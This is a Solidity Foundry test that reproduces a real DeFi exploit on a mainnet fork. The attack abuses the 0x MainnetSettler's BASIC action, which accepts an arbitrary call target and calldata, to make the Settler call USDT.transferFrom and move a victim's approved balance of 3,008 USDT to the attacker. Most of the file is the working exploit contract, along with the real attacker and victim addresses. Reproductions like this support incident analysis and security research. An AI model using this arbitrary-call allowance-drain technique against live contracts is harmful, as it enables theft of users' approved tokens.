// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3,008 USDT
// Attacker : 0xc58a769e3089792670dff22ab85a11983816323b
// Attack Contract : 0x447cd3a83134941523e7c0676f80e4e99bab28ab
// Vulnerable Contract : 0x0d0e364aa7852291883c162b22d6d81f6355428f
// Attack Tx : https://etherscan.io/tx/0x4e2f5bccc5d428c39cd93c64dcd2502d5cf05fb30892c753475155d498ef5887
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x0d0e364aa7852291883c162b22d6d81f6355428f#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/599
//
// The 0x MainnetSettler BASIC action lets the caller choose the pool target and
// calldata. The attacker targeted USDT itself and made the Settler call
// USDT.transferFrom(victim, attacker, amount). Because the victim had a large
// pre-existing USDT allowance to the Settler, the Settler acted as the spender
// and transferred the victim balance to the attacker.

address constant ATTACKER = 0xC58A769E3089792670DFf22aB85A11983816323b;
address constant HISTORICAL_ATTACK_CONTRACT = 0x447cD3A83134941523e7c0676f80e4e99bAb28ab;
address constant MAINNET_SETTLER = 0x0d0E364aa7852291883C162B22D6D81f6355428F;
address constant USDT_TOKEN = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant USDT_ALLOWANCE_VICTIM = 0x4D387992614Ff184fb587D590b76C00c48057b4b;

uint256 constant STOLEN_USDT_AMOUNT = 3_008_000_000;
bytes4 constant BASIC_ACTION_SELECTOR = 0x38c9c147;
bytes32 constant ZID_AND_AFFILIATE = 0xa00dda5ed0267accdf4ac6940000000000000000000000000000000000000000;

interface IMainnetSettler {
    struct AllowedSlippage {
        address recipient;
        address buyToken;
        uint256 minAmountOut;
    }

    function execute(
        AllowedSlippage calldata slippage,
        bytes[] calldata actions,
        bytes32 zidAndAffiliate
    ) external payable returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant usdt = IERC20(USDT_TOKEN);

    function setUp() public {
        uint256 forkBlock = 22_022_764;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = USDT_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(MAINNET_SETTLER, "0x MainnetSettler");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(USDT_ALLOWANCE_VICTIM, "USDT allowance victim");
    }

    function testExploit() public balanceLog {
        uint256 attackerUsdtBefore = usdt.balanceOf(ATTACKER);
        uint256 victimUsdtBefore = usdt.balanceOf(USDT_ALLOWANCE_VICTIM);
        uint256 victimAllowance = usdt.allowance(USDT_ALLOWANCE_VICTIM, MAINNET_SETTLER);

        assertEq(victimUsdtBefore, STOLEN_USDT_AMOUNT);
        assertGt(victimAllowance, STOLEN_USDT_AMOUNT);

        SettlerExploit exploit = new SettlerExploit();
        exploit.attack();

        assertEq(victimUsdtBefore - usdt.balanceOf(USDT_ALLOWANCE_VICTIM), STOLEN_USDT_AMOUNT);
        assertEq(usdt.balanceOf(ATTACKER) - attackerUsdtBefore, STOLEN_USDT_AMOUNT);
    }
}

contract SettlerExploit {
    function attack() external {
        bytes memory transferCall = abi.encodeWithSelector(
            IERC20.transferFrom.selector,
            USDT_ALLOWANCE_VICTIM,
            ATTACKER,
            STOLEN_USDT_AMOUNT
        );

        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodeWithSelector(
            BASIC_ACTION_SELECTOR,
            address(0),
            uint256(10_000),
            USDT_TOKEN,
            uint256(0),
            transferCall
        );

        IMainnetSettler.AllowedSlippage memory slippage = IMainnetSettler.AllowedSlippage({
            recipient: address(0),
            buyToken: address(0),
            minAmountOut: 0
        });

        IMainnetSettler(MAINNET_SETTLER).execute(slippage, actions, ZID_AND_AFFILIATE);
    }
}
